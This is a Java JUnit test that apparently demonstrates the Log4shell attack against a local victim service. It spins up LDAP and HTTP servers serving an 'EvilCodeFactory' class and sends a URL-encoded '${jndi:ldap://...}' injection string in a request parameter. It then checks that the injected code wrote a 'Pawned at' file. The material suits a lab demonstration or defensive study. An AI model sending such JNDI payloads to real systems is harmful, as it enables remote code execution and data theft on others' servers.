package log4shell.test;

import log4shell.hacker.tool.HttpServerSetup;
import log4shell.hacker.tool.LdapServerSetup;
import log4shell.hacker.injection.EvilCodeFactory;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import java.io.File;
import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;

import static java.net.http.HttpResponse.BodyHandlers;
import static java.nio.charset.StandardCharsets.UTF_8;
import static java.nio.file.Files.readString;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

public class Log4shellTest {
    private static final Logger log = LogManager.getLogger(Log4shellTest.class);

    final int LDAP_PORT = 12345;
    final int HTTP_PORT = 54321;
    final Class<?> injectedClass = EvilCodeFactory.class;

    final HttpServerSetup httpSrv = new HttpServerSetup(HTTP_PORT);
    final LdapServerSetup ldapSrv = new LdapServerSetup(LDAP_PORT, HTTP_PORT, injectedClass);

    @Test
    public void ldapCodeInjectionAttackTest() throws Exception {
        log.info("Start Log4shell attack demonstration");

        log.info("Check that target file doesn't exist");
        File tmpFile = EvilCodeFactory.EXPOSE_FILE_PATH.toFile();
        assertTrue(!tmpFile.exists() || tmpFile.delete());

        String injectionTrigger = String.format("${jndi:ldap://localhost:%s/cn=exploit}", LDAP_PORT);
        injectionTrigger = URLEncoder.encode(injectionTrigger, UTF_8);
        URI uri = URI.create("http://localhost:8080/greeting?name=" + injectionTrigger);

        log.info("Calling victim service {} to trigger code injection.", uri);
        var client = HttpClient.newBuilder().build();
        var req = HttpRequest.newBuilder().GET().uri(uri).build();
        var res = client.send(req, BodyHandlers.discarding());
        assertEquals(200 , res.statusCode());

        // Ensure that injected code was executed and file was created
        log.info("Check that target file is created by hacked service");
        assertTrue(tmpFile.exists());
        String content = readString(tmpFile.toPath());
        assertTrue(content.startsWith("Pawned at"));
        log.info("Data exposed by attacked host is:\n\n{}", content);
        log.info("Demonstration is successfully done");
    }

    @BeforeEach
    void startupServers() {
        httpSrv.start();
        ldapSrv.start();
    }

    @AfterEach
    void shutdownServers() {
        httpSrv.stop();
        ldapSrv.stop();
    }
}
